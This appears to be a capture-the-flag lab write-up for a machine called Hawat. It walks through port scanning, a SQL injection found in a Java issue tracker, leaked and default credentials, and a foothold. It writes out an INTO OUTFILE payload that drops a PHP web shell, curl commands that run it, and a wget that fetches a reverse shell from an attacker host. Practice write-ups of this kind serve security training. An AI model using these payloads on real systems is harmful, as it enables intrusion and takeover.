---
icon: linux
---

# Hawat

## Summary

* Target exposed 3 different web apps on ports 17445, 30455, and 50080.
* Source code of the Issue Tracker (port 17445) revealed a SQL injection vulnerability in the `priority` parameter.
* Used SQLi to write a PHP web shell into the document root (discovered via `phpinfo.php`).
* Triggered the shell to gain initial access to the system.
* Used `wget` to upload a reverse shell and executed it for full command execution.

## 🧵 Let's Unpack

### **Enumeration**

```bash
nmap -p- -T4 -vvv -Pn -oN nmap-all --max-retries 1 192.168.167.147 
```

Open ports: `22`, `17445`, `30455`, `50080`

***

**🔎 Web App (17445)**

* Found login/register pages.
* Identified the use of Java + SQL backend from source code.
*   SQL Injection found in:

    ```java
    Strings query = "SELECT message FROM issue WHERE priority='"+priority+"'";
    ```
*   Credentials in source:

    ```
    user: issue_user
    pass: ManagementInsideOld797
    ```

***

**🔎 Web App (30455)**

* Exposed `phpinfo.php`.
*   Revealed document root:

    ```
    $_SERVER['DOCUMENT_ROOT'] = /srv/http
    ```

***

**🔎 Web App (50080)**

* NextCloud instance hosted at `/cloud`.
* Default creds worked: `admin:admin`.

***

**Initial Foothold**

1.  **Wrote Web Shell using SQL Injection**

    ```sql
    priority=Normal' UNION SELECT ('<?php echo exec($_GET["cmd"]);?>') INTO OUTFILE '/srv/http/cmd.php'; -- 
    ```
2.  **Executed commands via shell**

    ```bash
    curl "http://192.168.120.130:30455/cmd.php?cmd=id"
    ```
3.  **Uploaded reverse shell**

    ```bash
    wget http://192.168.118.3:443/rev.txt -O /srv/http/rev.php
    curl http://192.168.120.130:30455/rev.php
    ```
4.  **Caught shell**

    ```bash
    nc -lvnp 443
    ```

✅ Shell access achieved!

***

\
